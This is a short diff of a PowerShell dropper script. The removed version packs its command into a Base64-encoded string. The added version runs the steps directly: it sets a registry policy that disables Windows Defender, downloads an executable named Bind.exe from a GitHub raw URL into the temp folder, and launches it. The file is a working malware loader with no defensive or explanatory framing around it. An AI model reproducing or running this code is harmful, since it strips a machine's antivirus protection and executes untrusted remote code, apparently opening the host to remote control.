@@ -1,3 +1,2 @@
-$command = 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f;$url="https://github.com/yousif111/te/raw/main/Bind.exe.exe";$output="$env:TEMP\Bind.exe";Invoke-WebRequest -Uri $url -OutFile $output;Start-Process -FilePath $output -Wait'
-$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
-Write-Output $encodedCommand
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
+$url="https://github.com/yousif111/te/raw/main/Bind.exe.exe";$output="$env:TEMP\Bind.exe";Invoke-WebRequest -Uri $url -OutFile $output;Start-Process -FilePath $output -Wait
